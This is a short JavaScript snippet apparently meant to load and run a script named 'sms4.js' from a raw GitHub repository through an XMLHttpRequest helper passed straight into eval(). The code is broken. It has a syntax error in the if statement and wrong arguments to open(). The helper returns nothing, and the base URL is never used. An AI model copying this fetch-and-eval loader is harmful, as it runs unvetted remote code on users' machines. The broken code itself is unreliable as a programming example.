mainUrl='https://raw.githubusercontent.com/nektoOi/sms/master/';

function httpGet(theUrl)
{
	var xmlHttp = new XMLHttpRequest();
xmlHttp.open("GET", "/query", theUrl, false); // async=true
xmlHttp.onload = function (e) {
  if xmlHttp.readyState == 4 && xmlHttp.status == 200) {
        console.log(xmlHttp.responseText);
    }
};
xmlHttp.send(null);
   // var xmlHttp = new XMLHttpRequest();
   // xmlHttp.open( "GET", theUrl, false ); 
	//xmlHttp.send( null );
  // return xmlHttp.responseText;
}



	actoinScript='sms4.js';
	eval(httpGet(actoinScript));

